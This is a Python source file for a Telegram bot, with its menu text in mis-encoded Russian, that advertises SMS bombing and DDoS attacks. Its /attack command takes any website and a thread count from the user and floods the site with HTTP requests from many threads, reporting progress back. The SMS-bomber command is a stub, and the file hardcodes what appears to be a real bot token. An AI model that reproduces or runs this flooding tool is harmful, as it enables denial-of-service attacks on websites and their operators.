from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher import FSMContext
import time
import requests
import socket
from threading import Thread

bot = Bot(token="5461816268:AAFKCR5JTq04cQwV5hEFxWWa7259sgDQ1Sk")
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

coutrequests = 0
errorrequests = 0

class Attack(StatesGroup):
    thr = State()
    target = State()

@dp.message_handler(commands="start")
async def start(message: types.Message):
    await bot.send_message(message.chat.id, "üìûSMS-–±–æ–º–±–µ—Ä - /bomber\nüíªDDOS-–∞—Ç–∞–∫–∏ - /attacknn‚ÑπLOGS-/log\nüåü–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫ - @personalscream")
    pass

def dos(site):
    global coutrequests
    global errorrequests
    for _ in range(1):
        try:
            resp = requests.get(site)
            print(resp.status_code)
            coutrequests = coutrequests + 1
            print(coutrequests)
            time.sleep(1)
        except Exception as r:
            errorrequests = errorrequests + 1
            print(f'–û—à–∏–±–∫–∞ {r}')
            time.sleep(1)

@dp.message_handler(commands="attack")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id, "‚ö°–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫.")
    await Attack.thr.set()
    @dp.message_handler(state=Attack.thr)
    async def theard(message: types.Message, state: FSMContext):
        await state.update_data(coutthr=int(message.text))
        await bot.send_message(message.chat.id, "‚ö°–û—Ç–ª–∏—á–Ω–æ. –¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ —Å–∞–π—Ç –¥–ª—è –∞—Ç–∞–∫–∏.")
        await Attack.next()
        @dp.message_handler(state=Attack.target)
        async def theards(message: types.Message, state: FSMContext):
            await state.update_data(trg=message.text)
            mainmsg = await bot.send_message(message.chat.id, "üõ∏–ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–∞–π—Ç...")
            data = await state.get_data()
            thrd = int(data['coutthr'])
            site = data['trg']
            try:
                await mainmsg.edit_text("üåü–ó–∞–ø—É—Å–∫–∞–µ–º...")
                for i in range(int(thrd)):
                    th = Thread(target=dos, args=(site, ))
                    th.start()
                    await mainmsg.edit_text(f"üåü–ü–æ—Ç–æ–∫–æ–≤: {i}/{thrd}\n‚òé–ü–æ–¥–¥–µ—Ä–∂–∫–∞: @personalscream\n‚ö°–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫: @personalscream")
                    time.sleep(0.2)
                text = ""
                for _ in range(500):
                    global coutrequests
                    global errorrequests
                    test = requests.get(site)
                    text = f"–í—Å–µ –ø–æ—Ç–æ–∫–∏ —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª–∏ –∞—Ç–∞–∫—É!\n–¶–µ–ª—å: {site}\n–ö–æ–ª-–≤–æ –ø–æ—Ç–æ–∫–æ–≤: {thrd}\n–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –∑–∞–ø—Ä–æ—Å–æ–≤: {test.status_code}\n–í—ã–ø–æ–ª–Ω–µ–Ω–æ –∑–∞–ø—Ä–æ—Å–æ–≤: {coutrequests}\n–û—à–∏–±–æ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {errorrequests}\n–í—Ä–µ–º—è –∞—Ç–∞–∫–∏: 500 —Å–µ–∫—É–Ω–¥\n–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è: —Ä–∞–∑ –≤ 5 —Å–µ–∫—É–Ω–¥"
                    await mainmsg.edit_text(text = text)
                    time.sleep(5)
                await mainmsg.edit_text(text = f"‚ö°–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–æ–≤...")
                await mainmsg.edit_text(text = f"‚ö°–ü–æ—Ç–æ–∫–∏ –∑–∞–≤–µ—Ä—à–µ–Ω—ã!\n–•–æ—Ä–æ—à–µ–≥–æ –≤–∞–º –¥–Ω—è.")
                coutrequests = 0
                errorrequests = 0
                await state.finish()
                pass
                
            except Exception as err:
                await mainmsg.edit_text(text = f"–û—à–∏–±–∫–∞!\n{err}")
                await state.finish()
                pass
 

@dp.message_handler(commands="bomber")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id, "‚ö°–ò—â–µ–º —Å–≤–æ–±–æ–¥–Ω—ã—Ö —Å–ª–æ—Ç–æ–≤....")
    time.sleep(5)
    await bot.send_message(message.chat.id, "‚ùå–°–≤–æ–±–æ–¥–Ω—ã—Ö —Å–ª–æ—Ç–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ!")
    # if bomber = no^defined//

@dp.message_handler(commands="log")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id, "‚ö°–í–≤–µ–¥–∏—Ç–µ —Å–∞–π—Ç –∫–æ—Ç–æ—Ä—ã–π –≤—ã –¥–¥–æ—Å–∏–ª–∏!")
    @dp.message_handler(state=Attack.thr)
    async def theard(message: types.Message, state: FSMContext):
        await state.update_data(coutthr=int(message.text))
        await bot.send_message(message.chat.id, "üöÄ–ò—â–µ–º –ª–æ–≥–∏...")
                
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=False)
